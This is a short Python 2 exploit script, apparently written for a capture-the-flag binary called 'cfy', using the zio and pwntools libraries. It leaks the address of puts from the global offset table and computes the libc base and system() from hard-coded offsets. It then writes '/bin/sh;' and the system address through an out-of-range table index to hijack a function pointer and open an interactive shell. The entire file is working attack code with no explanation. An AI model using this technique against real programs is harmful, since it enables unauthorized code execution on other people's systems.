from zio import *
from pwn import *

target = "./cfy"
def get_io(target):
	io = zio(target, timeout = 9999, print_read = COLORED(RAW, "green"), print_write = COLORED(RAW, "blue"))
	return io

def pwn(io):

	puts_got = 0x0000000000601018

	io.read_until("quit\n")
	io.write("2\n")
	io.read_until("number: ")
	io.write(l64(puts_got) + "\n")

	io.read_until("hex: ")
	puts_real = int(io.read_until("\n").strip("\n"), 16)
	print "puts addr:", hex(puts_real)

	libc = puts_real - 0x000000000006FEC0
	system = libc + 0x0000000000044C40

	parse_addr = 0x601080
	buff_addr = 0x6010E0

	diff = (buff_addr - parse_addr) / 0x10 + 1
	
	buff_data = "/bin/sh;".ljust(16, 'a')
	buff_data += l64(system)

	io.read_until("quit\n")
	io.write(str(diff) + "\n")
	io.read_until("number: ")
	io.write(buff_data + "\n")
	io.interact()

io = get_io(target)
pwn(io)
